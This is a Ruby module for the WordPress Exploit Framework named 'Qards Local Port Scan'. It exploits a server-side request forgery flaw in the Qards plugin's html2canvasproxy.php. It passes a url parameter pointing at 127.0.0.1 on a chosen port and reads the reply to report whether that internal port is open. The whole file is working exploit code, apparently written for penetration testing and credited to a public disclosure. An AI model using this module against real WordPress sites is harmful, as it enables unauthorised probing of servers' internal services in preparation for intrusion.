# frozen_string_literal: true

class Wpxf::Auxiliary::QardsLocalPortScan < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Qards Local Port Scan',
      desc: %(
        This module exploits a server side request forgery vulnerability, which
        enables a remote user to check if a service is running on a local port.
      ),
      author: [
        'theMiddle',                      # Disclosure
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '8933']
      ],
      date: 'Oct 11 2017'
    )

    register_options([
      PortOption.new(
        name: 'lport',
        desc: 'The port number to scan',
        required: true,
        default: 22
      )
    ])
  end

  def check
    res = execute_get_request(url: scan_url)
    res&.code == 200 ? :vulnerable : :safe
  end

  def scan_url
    normalize_uri(wordpress_url_plugins, 'qards', 'html2canvasproxy.php')
  end

  def lport
    normalized_option_value('lport')
  end

  def run
    return false unless super

    res = execute_get_request(url: scan_url, params: { 'url' => "http://127.0.0.1:#{lport}" })

    unless res&.code == 200
      emit_error 'Response code was not 200', true
      return false
    end

    if res.body.match?(/SOCKET: Connection refused/)
      emit_warning "Port #{lport} is closed"
    else
      emit_success "Port #{lport} is open"
    end

    true
  end
end
